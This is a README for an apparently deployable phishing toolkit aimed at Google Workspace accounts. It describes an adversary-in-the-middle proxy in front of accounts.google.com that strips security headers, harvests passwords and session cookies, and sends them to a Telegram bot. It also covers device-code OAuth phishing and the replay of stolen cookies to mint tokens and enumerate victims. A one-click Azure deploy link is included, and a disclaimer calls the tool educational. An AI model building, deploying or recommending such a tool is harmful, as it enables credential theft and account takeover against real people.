# Google AiTM Function PoC

* Google AiTM Phishing PoC for Google Workspace / Cloud Identity accounts with automated replay of captured sessions.
* This code is provided for educational purposes only and provided without any liability or warranty.
* Based on: https://github.com/nicolonsky/AzureAiTMFunction

## Deploy to Azure

[![Deploy to Azure](https://aka.ms/deploytoazurebutton)](https://portal.azure.com/#create/Microsoft.Template/uri/https%3A%2F%2Fraw.githubusercontent.com%2Fsolidity-lang-org%2FGoogleAiTMFunction%2Fmaster%2Fazuredeploy.json)

## How it works

### 1. AiTM Reverse Proxy (phishing.js)
- Sits in front of `accounts.google.com`
- Strips Google's security headers (CSP, HSTS, X-Frame-Options)
- Rewrites cookie domains so session cookies land on attacker domain
- Harvests plaintext credentials (Email/Passwd from login forms)
- Harvests Google session cookies (SAPISID, SSID, HSID, LSID, etc.)
- Exfiltrates to Telegram

### 2. Device Code Phishing (devicecode_landing.js + devicecode_poll.js)
- Initiates Google's OAuth device code flow
- Displays a branded phishing page with the user code
- Polls for token exchange completion (up to 5 minutes)
- Captures OAuth access + refresh tokens

### 3. Cookie Replay & Token Exchange (execution.js)
- Replays stolen cookies at `accounts.google.com` with `prompt=none`
- Obtains authorization code from the existing session
- Exchanges for OAuth access + refresh tokens
- Enumerates victim: user info, Gmail profile

## Configuration

Deploy with these parameters:
- **telegramBotToken** — Your Telegram bot token for credential exfiltration
- **telegramChatId** — Your Telegram chat ID where alerts will be sent
- **googleClientId** — OAuth Client ID (defaults to Google's own client ID: `32555940559.apps.googleusercontent.com`)

## Endpoints

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/*` | GET/POST | AiTM reverse proxy to accounts.google.com |
| `/deviceCode` | GET | Device code phishing landing page |
| `/deviceCode` | PUT | Start polling for device code completion |
| `/execution` | POST | Submit cookies for replay and token exchange |

## Disclaimer

This tool is for educational and authorized red-team testing only. Unauthorized use against targets without explicit consent is illegal.